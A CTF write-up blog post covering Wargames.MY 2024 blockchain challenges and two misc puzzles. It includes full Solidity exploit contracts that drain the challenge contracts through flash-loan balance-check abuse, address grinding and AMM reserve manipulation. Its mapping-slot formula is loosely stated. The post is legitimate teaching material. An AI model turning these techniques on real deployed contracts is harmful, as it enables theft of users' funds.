---
title: "Wargames.MY 2024"
date: 2024-12-30
draft: false
tags: ['ctf', 'blockchain']
---


I played Wargames.MY with NUS Greyhats at the tail end of 2024. I mainly did blockchain challenges, and we managed to finish first! Here are my writeups for the challenges I did.

{{< figure src="/posts/wgmy24/wargamesmy2024scoreboard.png">}}
<!--more-->


## Blockchain

### Death Star 2.0 (Easy)

For this challenge, we have to drain the DeathStar contract of all its funds.

This one is funny, in the DeathStar contract there is this function, which is unpermissioned and drains the contract of its funds.
~~~solidity
function withdrawEnergy(uint256 amount) external {    
    (bool success, ) = msg.sender.call{value: amount}("");
    require(success, "Transfer failed");

    balances[msg.sender] = 0; 
}
~~~
So all we need to do is call the function and we win. :D


### GuessIt (Easy)

Solving this challenge requires us to set `isKeyFound` to be true. To do so, we must call the unlock function in the following contract.
~~~solidity
contract EasyChallenge {
    uint constant isKey = 0x1337;

    bool public isKeyFound;
    mapping (uint => bytes32) keys; 

    constructor() {
        keys[isKey] = keccak256(
            abi.encodePacked(block.number, msg.sender) 
        );
    }

    function unlock(uint slot) external {
        bytes32 key;
        assembly {
            key := sload(slot)
        }
        require(key == keys[isKey]);
        isKeyFound = true;
    }
}
~~~

Luckily for us, we can derive the specific slot an entry in a mapping is at. Since the mapping key is a value type (uint), the slot can be calculated by the following equation, where k is the key, and p is the base slot of the mapping.
~~~solidity
keccak256(h(k) * p )
~~~

In this contract, the map is at slot 1, and the key is known. We can thus solve derive the storage slot and solve the challenge.


### Dungeons and Naga (Medium)

For this challenge, we have to drain the DungeonsAndDragons contract of all its funds.
 
The only way we can do this is by calling the `finalDragon` function, as the withdraw function is blocked by the `onlyCreator` modifier
~~~solidity
function finalDragon() public nonReentrant {
    Character storage character = characters[msg.sender];
    require(character.level >= 20, "Character level too low to fight the final dragon");

    uint256 fateScore = uint256(keccak256(abi.encodePacked(msg.sender, salt, uint256(999)))) % 100;
    

    if (fateScore > 50) {
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Reward transfer failed");
        emit FinalDragonDefeated(msg.sender);
    }
}
~~~
Unfortunately, there are a few restrictions blocking our way.
- Firstly, we need a character of at least level 20.
- Secondly, we need an address that fulfills the fateScore condition.

For the second one, we can solve it by repeatedly creating contracts until we obtain an address that fulfills the condition.
The first one is slightly trickier. There are three ways to level up our character in the contract. ```completeDungeon```, ```completeRaid``` and ```fightMonster```. Unfortunately, creating up raids and dungeons requires us to be the owner. However, creating monsters does not, so we will have to go with that route.

~~~solidity
function createMonster(string memory _name, uint256 _health, uint256 _attack) public {
    monsters.push(Monster(_name, _health, _attack));
}

function fightMonster(uint256 _monsterIndex) public nonReentrant {
    require(_monsterIndex < monsters.length, "Invalid monster index");
    Monster memory monster = monsters[_monsterIndex];
    Character storage character = characters[msg.sender];

    uint256 fateScore = uint256(keccak256(abi.encodePacked(msg.sender, salt, uint256(42)))) % 100;
    
    require(fateScore > 30, "Monster fight failed! Bad luck!");

    if (character.strength + character.dexterity + character.intelligence > monster.health + monster.attack) {
        emit MonsterDefeated(msg.sender, monster.name);
        character.experience += 50;
        character.level++;
        character.experience = 0;
    } else {
        revert("Monster too strong! Failed to defeat");
    }
}
~~~
To successfully fight a monster, we need:
- Our character stats to be greater than the monster's stats
- To fulfil the fate score condition
For the first condition, since we can control the monster's stats, we can just set the stats to be small (1,1), and any character we create will beat it.
For the second condition, again, we can fulfil the fate score condition by repeatedly creating contracts until we obtain an address that fulfills the condition.

So in summary, to solve the challenge, we need to do the following
- Create a contract that fulfills both fate score conditions
- Create a monster using that contract
- Fight the monster we created 20 times
- Fight the final dragon

This leads us to creating the following solve contract:
~~~solidity
contract SolveAttempt {
    bool public solve;
    string public salt = "weeee";
    DungeonsAndDragons dnd;
    constructor(address payable DND) payable{
        uint256 fateScore1 = uint256(keccak256(abi.encodePacked(address(this), salt, uint256(42)))) % 100;
        uint256 fateScore2 = uint256(keccak256(abi.encodePacked(address(this), salt, uint256(999)))) % 100;
        solve = fateScore1 > 30 && fateScore2 > 50;
        dnd = DungeonsAndDragons(DND);
    }


    function run() public{
        dnd.createCharacter{value: 0.1 ether}("a", 2);
        for (uint256 i = 0; i < 20; i ++){
            dnd.fightMonster(0);
        }
        dnd.finalDragon();
    }
    
}
~~~




### Bank Vaults (Hard)

To solve this challenge, we have to drain the BankVault of its funds.

The key vulnerability for this contract lies in its flashloan.

~~~solidity
function flashLoan(uint256 amount, address receiver, uint256 timelock) public {
    require(amount > 0, "Amount must be greater than 0");
    require(balances[msg.sender] > 0, "No stake found for the user");

    unchecked {
        require(timelock >= stakeTimestamps[msg.sender] + MINIMUM_STAKE_TIME, "Minimum stake time not reached");
    }

    require(address(this).balance >= amount, "Insufficient ETH for flash loan");

    uint256 balanceBefore = address(this).balance;

    (bool sent, ) = receiver.call{value: amount}("");
    require(sent, "ETH transfer failed");

    IFlashLoanReceiver(receiver).executeFlashLoan(amount);

    uint256 balanceAfter = address(this).balance;

    require(balanceAfter >= balanceBefore, "Flash loan wasn't fully repaid in ETH");
}
~~~
Specifically, it checks if the flashloan was repaid only by checking its balance before and after. This means it doesn't matter how we transfer the funds back to the contract when we finish our flashloan, only that the contract balance rises to its previous level. This allows us to take the flashloaned funds and stake them to raise our balance, without using any of our money.

~~~solidity
contract SolveAttempt {
    BankVaults bv;
    uint256 public constant MINIMUM_STAKE_TIME = 2 * 365 days;
    uint256 totalShares = 0;

    constructor(address payable bva) payable{
        bv = BankVaults(bva);
    }

    function solve() public {
        totalShares += bv.stake{value : address(this).balance}(address(this));
        uint256 timelock;
        unchecked{
            timelock = block.timestamp + MINIMUM_STAKE_TIME;
            bv.flashLoan(address(bv).balance, address(this), timelock);
        }
        bv.withdraw(address(bv).balance, address(this), address(this));
    }
    function executeFlashLoan(uint256 amount) public{
        totalShares += bv.stake{value : amount}(address(this));
    }


}
~~~


### Gentleman (Hard)
The last and hardest challenge of the bunch. Once again, to solve this challenge, we have to drain the Gentleman of its three tokens.
First, we notice most of the interesting functions are blocked behind a ```duringSwap``` modifier, which functions as follows.

~~~solidity
modifier duringSwap() {
    require(swapStates[nonce].hasBegun, "swap not in progress");
    _;
}

function swap() external {
    SwapState storage swapState = getSwapState();

    require(!swapState.hasBegun, "swap already in progress");
    swapState.hasBegun = true;

    SwapCallback(msg.sender).doSwap();

    require(swapState.unsettledTokens == 0, "not settled");
    nonce += 1;
}
~~~
Basically, to call any of the functions with this modifier, we must do so having started a swap via the ```swap``` function. This thus adds a limitation to our operations, that ```unsettledTokens == 0``` must be ```true```, and that we can only do one swap at a time.

Next, observe that there is only one way of withdrawing funds, via the ```withdraw``` function.
~~~
function withdraw(address token, uint256 amount) public duringSwap {
    require(allowedTokens[token], "token not allowed");

    IToken(token).transfer(msg.sender, amount);
    updatePosition(token, -int256(amount));
}
~~~
However, this calls `updatePosition` with the negative value of the amount we withdrew.

~~~solidity
function updatePosition(address token, int256 amount) internal {
    require(allowedTokens[token], "token not allowed");

    SwapState storage swapState = getSwapState();

    int256 currentPosition = swapState.positions[token];
    int256 newPosition = currentPosition + amount;

    if (newPosition == 0) swapState.unsettledTokens -= 1;
    else if (currentPosition == 0) swapState.unsettledTokens += 1;

    swapState.positions[token] = newPosition;
}
~~~
Furthermore, we can notice that ```updatePosition``` is always called when a token amount is being changed.

Theres alot happening here, so lets break it down into parts.

```swapState``` is the struct from earlier that represents the state of the swap, mainly the net inflow and outflow of each token
```swapState.position``` is the saved flow of the token.
```currentPosition``` represents the flow prior to our transaction.
```newPosition``` represents the flow after our transaction.
```swapState.unsettledTokens``` represents how many net flows are not 0.

So, what happens is everytime we update the amount of tokens in the contract, updatePosition is meant to reflect this change in token amounts and store the net gain or loss of each token. ```unsettledTokens``` will only be 0 when all the net changes are 0, and only then can we finish our swap without reverting.

Thus, we must somehow withdraw the tokens, but then reset the position of each token back to 0 so that unsettledTokens returns to 0.
One might have an idea to withdraw 0 initially, to cause unsettledTokens to underflow (as newPosition would be 0), so that we can then withdraw and overflow it back to 0 but this does not work as the contract is compiled in soldity version >8.0 and thus has underflow and overflow checks.

Lets now take a look at all the functions that call updatePosition, outside of the ```withdraw``` function.


~~~solidity
function initiateTransfer(address token) public duringSwap {
    require(allowedTokens[token], "token not allowed");

    SwapState storage swapState = getSwapState();
    SavedBalance storage state = swapState.savedBalances[token];

    require(!state.initiated, "transfer already initiated");

    state.initiated = true;
    state.balance = IToken(token).balanceOf(address(this));
}

function finalizeTransfer(address token) public duringSwap {
    require(allowedTokens[token], "token not allowed");

    SwapState storage swapState = getSwapState();
    SavedBalance storage state = swapState.savedBalances[token];

    require(state.initiated, "transfer not initiated");

    uint256 balance = IToken(token).balanceOf(address(this));
    uint256 amount = balance - state.balance;

    state.initiated = false;
    updatePosition(token, int256(amount));
}

function swapTokens(address tokenIn, address tokenOut, uint256 amountIn, uint256 amountOut) public duringSwap {
    require(allowedTokens[tokenIn], "token not allowed");
    require(allowedTokens[tokenOut], "token not allowed");

    uint256 liquidityBefore = getLiquidity(tokenIn, tokenOut);

    require(liquidityBefore > 0, "no liquidity");

    uint256 newReservesIn = getReserves(tokenIn, tokenOut) + amountIn;
    uint256 newReservesOut = getReserves(tokenOut, tokenIn) - amountOut;

    setReserves(tokenIn, tokenOut, newReservesIn);
    setReserves(tokenOut, tokenIn, newReservesOut);

    uint256 liquidityAfter = getLiquidity(tokenIn, tokenOut);

    updatePosition(tokenIn, -int256(amountIn));
    updatePosition(tokenOut, int256(amountOut));

    require(liquidityAfter >= liquidityBefore, "insufficient liquidity");
}
~~~
If ```initiateTransfer``` and ```finalizeTransfer``` remind you of the previous Bank Vault challenge, thats because a similar vulnerability is present.
If we were to withdraw all of token1 first, we would have an initial balance of 0 when we call ```initiateTransfer```. Next, if we were to return the balance back, ```finalizeTransfer``` would allow us to reset the position of the token back to 0, and cause it to become settled.

However, this doesn't help us on its own. Withdrawing and returning the money means we steal nothing. Thus, we have to look at ways we can transfer money back to the contract. Of course, we could simply transfer it normally as the token follows the ERC20 standard, but that doesn't help us in any way.
Instead, we can look at the ```addLiquidity``` function.


~~~solidity
function addLiquidity(address left, address right, uint256 amountLeft, uint256 amountRight) public {
    require(allowedTokens[left], "token not allowed");
    require(allowedTokens[right], "token not allowed");

    IToken(left).transferFrom(msg.sender, address(this), amountLeft);
    IToken(right).transferFrom(msg.sender, address(this), amountRight);

    setReserves(left, right, getReserves(left, right) + amountLeft);
    setReserves(right, left, getReserves(right, left) + amountRight);
}
~~~

This also plays in into the last function that calls ```updatePosition``` that we have yet to talk about, ```swapTokens```.
Observe how swapTokens allows us to arbitrarily update the position of any pair of tokens, so long as ```liquidityAfter >= liquidityBefore```.
Looking at the ```getLiquidity``` function, we can see it is calculated as follows.
~~~solidity
function getLiquidity(address left, address right) public view returns (uint256) {
    (,, Pool storage pool) = getPool(left, right);
    return pool.leftReserves * pool.rightReserves;
}
~~~
Notice that if the pool is heavily lopsided, we can reduce the higher side by a high amount, and only need to increase the low side by a small amount to get the same return value. Thus, with the addLiquidty exploit from earlier, we can manipulate the pools to all be incredibly lopsided, allowing us to swap high amounts of a token from one side of the pool while paying very little of the other token. Ideally, we should manipulate it such that all the swaps "cancel" each other out, leaving us with a net out equal to the total amount of each token. 

We thus get the following exploit chain.
- Withdraw all the tokens.
- Initiate transfer
- addLiquidty to return all the tokens, in a way that results in a lopsided pool
- Finalize transfer to reset the settled tokens.
- Repeat a few times to really mess with the pool.
- Withdraw all one final time.
- Swap in a manner that resets all the positions back to 0.

This leads us to the following solution. (dirty but it works)

~~~solidity
contract SolveAttempt {
    Gentleman gm;
    Token token1;
    address token1aa;
    Token token2;
    address token2aa;
    Token token3;
    address token3aa;
    uint256 balance1 = 300_000;
    uint256 balance2 = 300_000;
    uint256 balance3 = 600_000;

    constructor(address gma, address token1a, address token2a, address token3a) payable{
        gm = Gentleman(gma);
        token1 = Token(token1a);
        token1aa = token1a;
        token2 = Token(token2a);
        token2aa = token2a;
        token3 = Token(token3a);
        token3aa = token3a;
    }

    function solve() public {
        gm.swap();
    }
    function doSwap() external{
        for (uint i = 0; i < 10; i += 1){
            token1.approve(address(gm), balance1 * 3);
            token2.approve(address(gm), balance2 * 3);
            token3.approve(address(gm), balance3 * 3);
            gm.withdraw(token1aa, balance1 / 3 * 2);
            gm.withdraw(token2aa, balance2 / 3 * 2);
            gm.withdraw(token3aa, balance3 / 3 * 2);
            gm.initiateTransfer(token1aa);
            gm.initiateTransfer(token2aa);
            gm.initiateTransfer(token3aa);
            gm.addLiquidity(address(token1), address(token2), 0, balance2 / 3 * 2);
            gm.addLiquidity(address(token1), address(token3), balance1 / 3 * 2, 0);
            gm.addLiquidity(address(token2), address(token3), 0, balance3 / 3 * 2);
            gm.finalizeTransfer(token1aa);
            gm.finalizeTransfer(token2aa);
            gm.finalizeTransfer(token3aa);
        }
        gm.withdraw(token1aa, balance1 / 3 * 2);
        gm.withdraw(token2aa, balance2 / 3 * 2);
        gm.withdraw(token3aa, balance3 / 3 * 2);
        gm.swapTokens(token1aa, token2aa, 100000, 200000 + 100000);
        gm.swapTokens(token3aa, token1aa, 200000, 200000 + 100000);
        gm.swapTokens(token2aa, token3aa, 100000, 400000 + 200000);
    }

}
~~~


## Misc

### DCM Meta

The challenge description gives us the following: "[25, 10, 0, 3, 17, 19, 23, 27, 4, 13, 20, 8, 24, 21, 31, 15, 7, 29, 6, 1, 9, 30, 22, 5, 28, 18, 26, 11, 2, 14, 16, 12]", as well as a file with a DCM extension.

This was solved with the free hint that was given out, which told us that the string was a list of elements, and to recombine the elements and wrap them in the flag format to get the flag.
All we had to do was recombine the elements in the order provided to get the flag.

### Invisible Ink

For this challenge, we are given a gif, that is supposed to contain the flag.
When putting the gif through a frame extract, I noticed that 6 frames were extracted, however the last three were all identical.
Opening the gif inside 010 editor revealed that frames 4 and 5 had their positions messed up, such that they were out of bounds.
Restoring their positions revealed two new frames, however they were full of noise.
Relooking at the frames revealed that color index 2 was transparent. Unsetting its transparency and turning it into a bright color revealed that the two frames contained two different parts of the flag. Overlaying them over each other reveald the completed flag.
